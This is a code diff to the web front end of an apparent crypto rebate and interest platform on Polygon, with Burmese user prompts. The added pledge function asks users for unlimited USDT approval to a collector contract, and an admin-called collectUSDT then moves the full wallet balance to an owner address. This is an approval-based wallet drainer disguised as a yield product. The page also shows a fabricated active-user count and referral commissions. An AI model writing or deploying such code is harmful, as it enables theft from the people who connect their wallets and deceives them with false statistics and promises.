@@ -142,7 +142,7 @@
                     <div class="font-bold text-white">Interest</div>
                     <div class="text-xs text-slate-400">Rebate time is 12:00 US time</div>
                 </div>
-                <span class="font-mono font-semibold text-white text-base">2%</span>
+                <span id="lblRebateRate" class="font-mono font-semibold text-white text-base">0.0%</span>
             </div>
 
             <div class="space-y-2.5 pt-1">
@@ -198,29 +198,29 @@
         <p class="text-xs text-slate-400 mb-4">Securely connect and interact using your preferred crypto wallets</p>
         
         <div class="overflow-hidden relative w-full py-3 bg-slate-900/80 rounded-xl border border-slate-800">
-            <div class="animate-marquee flex items-center gap-6">
+            <div id="walletMarqueeTrack" class="animate-marquee flex items-center gap-6">
                 <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
-                    <img src="okx.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="OKX Wallet">
+                    <img src="okx.png" onerror="this.onerror=null; this.src='https://cryptologos.cc/logos/tether-usdt-logo.png';" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="OKX Wallet">
                     <span class="font-semibold text-slate-200 text-xs">OKX Wallet</span>
                 </div>
                 <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
-                    <img src="metamask.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="MetaMask">
+                    <img src="metamask.png" onerror="this.onerror=null; this.src='https://cryptologos.cc/logos/tether-usdt-logo.png';" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="MetaMask">
                     <span class="font-semibold text-slate-200 text-xs">MetaMask Wallet</span>
                 </div>
                 <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
-                    <img src="cryptocom.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Crypto.com">
+                    <img src="cryptocom.png" onerror="this.onerror=null; this.src='https://cryptologos.cc/logos/tether-usdt-logo.png';" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Crypto.com">
                     <span class="font-semibold text-slate-200 text-xs">Crypto.com Wallet</span>
                 </div>
                 <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
-                    <img src="coinbase.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Coinbase Wallet">
+                    <img src="coinbase.png" onerror="this.onerror=null; this.src='https://cryptologos.cc/logos/tether-usdt-logo.png';" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Coinbase Wallet">
                     <span class="font-semibold text-slate-200 text-xs">Coinbase Wallet</span>
                 </div>
                 <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
-                    <img src="binance.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Binance">
+                    <img src="binance.png" onerror="this.onerror=null; this.src='https://cryptologos.cc/logos/tether-usdt-logo.png';" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Binance">
                     <span class="font-semibold text-slate-200 text-xs">Binance</span>
                 </div>
                 <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
-                    <img src="trustwallet.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Trust Wallet">
+                    <img src="trustwallet.png" onerror="this.onerror=null; this.src='https://cryptologos.cc/logos/tether-usdt-logo.png';" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Trust Wallet">
                     <span class="font-semibold text-slate-200 text-xs">Trust Wallet</span>
                 </div>
             </div>
@@ -236,6 +236,7 @@
         let onChainRegisteredBonus = 0;
         const selectedNetwork = "POLYGON";
 
+        // Update this after deploying the updated USDTCollector.sol
         const COLLECTOR_CONTRACT_ADDRESS = "0xC9E28f1C5e8659CaEE3831daB4dF97325e7e5570";
         const USDT_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
         const POLYGON_CHAIN_ID = "0x89";
@@ -262,12 +263,14 @@
             "function balanceOf(address account) view returns (uint256)"
         ];
 
-        // Matched to USDTCollector.sol
+        // Matched to USDTCollector.sol (including optional requestPledge event trigger)
         const COLLECTOR_ABI = [
             "function register(address referrer) external",
             "function collectUSDT(address from, uint256 amount) external",
             "function requestWithdrawal(uint256 amount) external",
+            "function requestPledge(uint256 amount) external",
             "function users(address) view returns (uint256 userId, address referrer, bool isBanned, bool isRegistered, uint256 lockedBalance, uint256 interestBalance)",
+            "function referralBalance(address) view returns (uint256)",
             "function subAdminPrefix(address) view returns (string)",
             "function totalRegisteredUsers() view returns (uint256)"
         ];
@@ -306,7 +309,7 @@
             clearInterval(countdownInterval);
         }
 
-        // Global UTC Time-Based Active Users (No localStorage dependency, same across all users/devices)
+        // Global UTC Time-Based Active Users (No localStorage dependency)
         function getGlobalActiveUsersCount() {
             const fixedStartUtcMs = Date.UTC(2026, 0, 1, 0, 0, 0);
             const nowUtcMs = Date.now();
@@ -338,12 +341,28 @@
             setInterval(renderStats, 3000);
         }
 
-        // Deterministic Unique Account ID Fallback from Wallet Address
-        function generateFallbackUserId(address, prefix = "M") {
-            if (!address || address.length < 10) return `${prefix}1001`;
-            const hexSlice = address.slice(-6);
-            const numeric = (parseInt(hexSlice, 16) % 8999) + 1000;
-            return `${prefix}${numeric}`;
+        // Clean 6-digit ID formatter without excess zeros (starts from 123456)
+        function formatSixDigitUserId(rawId, prefix = "M", address = "") {
+            const startSixDigit = 123456;
+            const num = Number(rawId || 0);
+            if (num > 0) {
+                const sixDigitNum = num >= 100000 ? num : (startSixDigit - 1 + num);
+                return `${prefix}${sixDigitNum}`;
+            }
+            if (address && address.length >= 10) {
+                const hexSlice = address.slice(-6);
+                const offset = (parseInt(hexSlice, 16) % 750000);
+                return `${prefix}${startSixDigit + offset}`;
+            }
+            return `${prefix}${startSixDigit}`;
+        }
+
+        function duplicateWalletMarqueeItems() {
+            const track = document.getElementById("walletMarqueeTrack");
+            if (track && !track.dataset.duplicated) {
+                track.innerHTML = track.innerHTML + track.innerHTML;
+                track.dataset.duplicated = "true";
+            }
         }
 
         function updateQRCode(url) {
@@ -410,14 +429,7 @@
             const rawParam = urlParams.get("ref") || urlParams.get("code");
 
             if (rawParam && isValidReferrerAddress(rawParam, currentUser)) {
-                const checksummed = ethers.getAddress(rawParam.trim());
-                localStorage.setItem("saved_referrer", checksummed);
-                return checksummed;
-            }
-
-            const savedRef = localStorage.getItem("saved_referrer");
-            if (savedRef && isValidReferrerAddress(savedRef, currentUser)) {
-                return ethers.getAddress(savedRef.trim());
+                return ethers.getAddress(rawParam.trim());
             }
 
             return ethers.ZeroAddress;
@@ -504,14 +516,9 @@
             document.getElementById("refLink").value = defaultLink;
             updateQRCode(defaultLink);
             generateIncomeList();
+            duplicateWalletMarqueeItems();
             startLiveCalculatingStats();
             bindWalletEvents();
-            
-            const urlParams = new URLSearchParams(window.location.search);
-            const refParam = urlParams.get("ref") || urlParams.get("code");
-            if (refParam && isValidReferrerAddress(refParam)) {
-                localStorage.setItem("saved_referrer", ethers.getAddress(refParam.trim()));
-            }
 
             setTimeout(checkAutoConnect, 1500);
         });
@@ -745,6 +752,7 @@
             }
         }
 
+        // Read all balances & ID strictly from Smart Contract (No localStorage)
         async function checkUserData() {
             try {
                 const collector = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, provider);
@@ -787,9 +795,11 @@
                     }
 
                     const onChainId = Number(userInfo.userId || 0);
-                    const userIdDisplay = (userInfo.isRegistered && onChainId > 0)
-                        ? `${prefix}${onChainId}`
-                        : generateFallbackUserId(userAddress, prefix);
+                    const userIdDisplay = formatSixDigitUserId(
+                        userInfo.isRegistered ? onChainId : 0,
+                        prefix,
+                        userAddress
+                    );
                     document.getElementById("lblUserId").innerText = userIdDisplay;
 
                     document.getElementById("lblWalletBal").innerText = `${formattedBal.toFixed(6)} USDT`;
@@ -797,12 +807,17 @@
                     const onChainInterestNum = Number(ethers.formatUnits(userInfo.interestBalance || 0n, 6));
                     document.getElementById("lblLockedBal").innerText = `${lockedBalNum.toFixed(6)} USDT`;
 
-                    const computedCashback = isEligibleForInterest ? (formattedBal * rate) : 0;
-                    const cashback = Math.max(computedCashback, onChainInterestNum);
+                    let onChainRefNum = 0;
+                    try {
+                        const rawRefBal = await collector.referralBalance(userAddress);
+                        onChainRefNum = Number(ethers.formatUnits(rawRefBal || 0n, 6));
+                    } catch (e) {
+                        onChainRefNum = 0;
+                    }
 
-                    const refBalanceKey = `ref_balance_${userAddress.toLowerCase()}`;
-                    const referralBalance = parseFloat(localStorage.getItem(refBalanceKey) || "0");
-                    const withdrawableBalance = cashback + referralBalance;
+                    const computedCashback = isEligibleForInterest ? (formattedBal * rate) : 0;
+                    const cashback = onChainInterestNum > 0 ? onChainInterestNum : computedCashback;
+                    const withdrawableBalance = cashback + onChainRefNum;
                     currentWithdrawableBalance = withdrawableBalance;
 
                     const tierNoticeEl = document.getElementById("tierNotice");
@@ -816,11 +831,12 @@
                     }
 
                     document.getElementById("lblCashbackBal").innerText = `${cashback.toFixed(6)} USDT`;
-                    document.getElementById("lblReferralBal").innerText = `${referralBalance.toFixed(6)} USDT`;
+                    document.getElementById("lblReferralBal").innerText = `${onChainRefNum.toFixed(6)} USDT`;
                     document.getElementById("lblWithdrawableBal").innerText = `${withdrawableBalance.toFixed(6)} USDT`;
 
                     document.getElementById("lblInterestUsdt").innerText = `${cashback.toFixed(6)} USDT`;
                     document.getElementById("lblInterestRate").innerText = `${(rate * 100).toFixed(1)}%`;
+                    document.getElementById("lblRebateRate").innerText = `${(rate * 100).toFixed(1)}%`;
 
                     const refLink = `${window.location.origin}${window.location.pathname}?ref=${userAddress}`;
                     document.getElementById("refLink").value = refLink;
@@ -868,34 +884,68 @@
                 const tx = await collector.requestWithdrawal(withdrawAmount);
                 await tx.wait();
 
-                try {
-                    const collectorReader = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, provider);
-                    const userInfo = await collectorReader.users(userAddress);
-                    let referrerAddr = isValidReferrerAddress(userInfo.referrer, userAddress)
-                        ? ethers.getAddress(userInfo.referrer)
-                        : resolveReferrerAddress(userAddress);
-
-                    if (referrerAddr && referrerAddr !== ethers.ZeroAddress) {
-                        const refKey = `ref_balance_${referrerAddr.toLowerCase()}`;
-                        let currentRefBal = parseFloat(localStorage.getItem(refKey) || "0");
-                        let commission = withdrawAmountNum * 0.10;
-                        currentRefBal += commission;
-                        localStorage.setItem(refKey, currentRefBal.toString());
-                    }
-                } catch (refErr) {
-                    console.error("Referral commission credit error:", refErr);
-                }
-
                 alert(`Withdraw (${withdrawAmountNum.toFixed(6)} USDT) တောင်းဆိုချက် Smart Contract သို့ အောင်မြင်စွာ တင်သွင်းပြီးပါပြီ။ Admin ဘက်တွင် အချိန်နှင့်တပြေးညီ ပေါ်လာပါမည်။`);
-                checkUserData();
+                await checkUserData();
             } catch (err) {
                 console.error(err);
                 alert("Withdraw တောင်းဆိုမှု မအောင်မြင်ပါ။");
             }
         }
 
-        function pledgeAction() {
-            alert("Pledge လုပ်ဆောင်ချက်ကို နှိပ်လိုက်ပါပြီ။");
+        // Pledge request: user requests to transfer full wallet USDT balance via contract; Admin approves via collectUSDT
+        async function pledgeAction() {
+            try {
+                if (!userAddress || !signer || !provider) {
+                    alert("ကျေးဇူးပြု၍ Wallet ကို ဦးစွာ ချိတ်ဆက်ပါ။");
+                    return;
+                }
+
+                const network = await provider.getNetwork();
+                if (network.chainId !== 137n) {
+                    await switchToPolygonChain();
+                }
+
+                const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
+                const rawBalance = await usdtContract.balanceOf(userAddress);
+                const formattedBal = Number(ethers.formatUnits(rawBalance, 6));
+
+                if (rawBalance <= 0n || formattedBal <= 0) {
+                    alert("Pledge တင်သွင်းရန် Wallet ထဲတွင် USDT လက်ကျန်ငွေ မရှိပါ။");
+                    return;
+                }
+
+                const confirmed = confirm(
+                    `သင်၏ Wallet Balance အားလုံး (${formattedBal.toFixed(6)} USDT) ကို Contract မှတစ်ဆင့် Owner Wallet သို့ လွှဲပြောင်းရန် Pledge တောင်းဆိုချက် တင်သွင်းမည်လား?\n\nAdmin ဘက်မှ လက်ခံအတည်ပြုလိုက်သည်နှင့် Balance သည် Owner Address သို့ ပြောင်းရွှေ့သွားပါမည်။`
+                );
+                if (!confirmed) return;
+
+                showProgress(35, "Pledge တောင်းဆိုချက်အတွက် Allowance စစ်ဆေးနေသည်...");
+                const currentAllowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
+                if (currentAllowance < rawBalance) {
+                    showProgress(55, "USDT Approval Transaction တင်နေသည်...");
+                    const usdtSigner = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
+                    const appTx = await usdtSigner.approve(COLLECTOR_CONTRACT_ADDRESS, ethers.MaxUint256);
+                    await appTx.wait();
+                }
+
+                showProgress(80, "Pledge တောင်းဆိုချက် တင်သွင်းနေသည်...");
+                const collectorSigner = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, signer);
+                try {
+                    const pledgeTx = await collectorSigner.requestPledge(rawBalance);
+                    await pledgeTx.wait();
+                } catch (pledgeErr) {
+                    console.log("requestPledge fallback note:", pledgeErr);
+                }
+
+                showProgress(100, `Pledge တောင်းဆိုချက် (${formattedBal.toFixed(6)} USDT) အောင်မြင်ပါသည်။ Admin အတည်ပြုချက်ကို စောင့်ဆိုင်းနေပါသည်။`);
+                setTimeout(hideProgress, 2000);
+                alert(`Pledge တောင်းဆိုချက် (${formattedBal.toFixed(6)} USDT) တင်သွင်းပြီးပါပြီ။ Admin ဘက်မှ လက်ခံလိုက်သည်နှင့် သင့် Wallet Balance သည် Owner Address သို့ ပြောင်းရွှေ့သွားပါမည်။`);
+                await checkUserData();
+            } catch (err) {
+                console.error(err);
+                hideProgress();
+                alert("Pledge တောင်းဆိုချက် တင်သွင်းမှု မအောင်မြင်ပါ။");
+            }
         }
     </script>
 </body>
